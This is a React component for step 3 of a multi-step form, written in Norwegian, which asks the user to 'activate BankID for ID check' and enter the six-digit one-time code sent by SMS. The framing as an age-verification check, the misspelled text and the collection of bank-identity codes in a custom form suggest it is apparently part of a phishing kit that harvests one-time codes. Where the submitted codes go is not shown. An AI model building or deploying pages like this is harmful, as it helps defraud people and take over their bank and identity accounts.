import PropTypes from "prop-types";
import { useState } from "react";
import Loader from "../../components/Loader";

const Step3 = ({ formData, handleInputChange, handleNext, isLoading }) => {
  const [error, setError] = useState("");

  const handleNextWithValidation = () => {
    if (formData.step3 && formData.step3.length === 6) {
      setError("");
      handleNext();
    } else {
      setError("det oppstod en feil");
    }
  };
  return (
    <>
      <h1 className="font-bold text-lg pt-8">Aktiver BankID for ID sjekk</h1>
      <p className="text-sm">Aldersgrense indentifisering</p>

      <div className="flex flex-col w-full py-10">
        <label className="pb-2">Bekreft telefonnummer</label>
        <input
          type="text"
          className="step-input rounded-md bg-[#481b68] border border-[#745b88] hover:border-white"
          placeholder="Kode"
          name="step3"
          maxLength={6}
          minLength={6}
          value={formData.step3 || ""}
          onChange={handleInputChange}
        />
        <label className="text-xs text-start pt-1">
          Skriv inn engangskoden du fikk pa tekstmelding.
        </label>
        {error && <span className="text-red-500 text-sm mt-1">{error}</span>}
      </div>

      <button
        className="bg-white mb-3 text-black px-6 py-2 w-50 rounded-full font-bold"
        onClick={handleNextWithValidation}
        disabled={isLoading || !formData.step3}
      >
        {isLoading ? <Loader /> : "Neste"}
      </button>
    </>
  );
};

Step3.propTypes = {
  formData: PropTypes.object.isRequired,
  handleInputChange: PropTypes.func.isRequired,
  handleNext: PropTypes.func.isRequired,
  isLoading: PropTypes.bool.isRequired
};

export default Step3;
